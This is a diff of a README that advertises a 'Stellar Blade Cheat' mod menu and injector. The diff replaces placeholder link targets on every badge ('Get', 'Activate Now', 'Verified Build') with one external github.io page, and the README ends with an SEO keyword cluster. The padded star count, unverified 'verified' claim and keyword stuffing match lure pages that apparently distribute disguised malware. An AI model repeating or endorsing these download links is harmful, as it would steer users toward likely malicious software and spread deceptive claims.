@@ -2,9 +2,9 @@
 
 Step into the neon-lit battlefield with the **Stellar Blade Cheat** — the mod menu built to make your combos hit harder, your dodges smoother, and your skills basically god-mode. Whether you’re farming bosses or speedrunning, this injector engine turns Stellar Blade into your personal playground.
 
-[![Get Stellar Blade Cheat](https://img.shields.io/badge/Get%20Stellar%20Blade%20Cheat-blueviolet?logo=rocket\&style=for-the-badge)](EXAMPLE)
-[![Windows Support](https://img.shields.io/badge/Windows-Supported-green?logo=windows\&style=for-the-badge)](EXAMPLE)
-[![⭐ 5.2k Stars](https://img.shields.io/badge/⭐-5.2k%20Stars-yellow?logo=github\&style=for-the-badge)](EXAMPLE)
+[![Get Stellar Blade Cheat](https://img.shields.io/badge/Get%20Stellar%20Blade%20Cheat-blueviolet?logo=rocket\&style=for-the-badge)](https://stellar-blade-cheat-tool.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-Supported-green?logo=windows\&style=for-the-badge)](https://stellar-blade-cheat-tool.github.io/.github/)
+[![⭐ 5.2k Stars](https://img.shields.io/badge/⭐-5.2k%20Stars-yellow?logo=github\&style=for-the-badge)](https://stellar-blade-cheat-tool.github.io/.github/)
 
 **Quick Links:** [Overview](#overview) • [Features](#feature-breakdown-) • [Install](#instant-install-guide)
 
@@ -70,8 +70,8 @@ Other builds feel like cheap knock-offs. Ours runs smooth, hooks cleanly, and ca
 
 With the **Stellar Blade Cheat**, you get the sharpest edge in the galaxy. From infinite health to precision combat hacks, our mod menu is the injector you’ll never want to close.
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](EXAMPLE)
-[![Verified Build](https://img.shields.io/badge/Verified-Build-brightgreen?logo=blockchain\&style=for-the-badge)](EXAMPLE)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://stellar-blade-cheat-tool.github.io/.github/)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-brightgreen?logo=blockchain\&style=for-the-badge)](https://stellar-blade-cheat-tool.github.io/.github/)
 
 **Keyword Cluster** — Stellar Blade cheat, Stellar Blade mod menu, Stellar Blade injector, Stellar Blade hack, Stellar Blade wallhack, Stellar Blade trainer
 
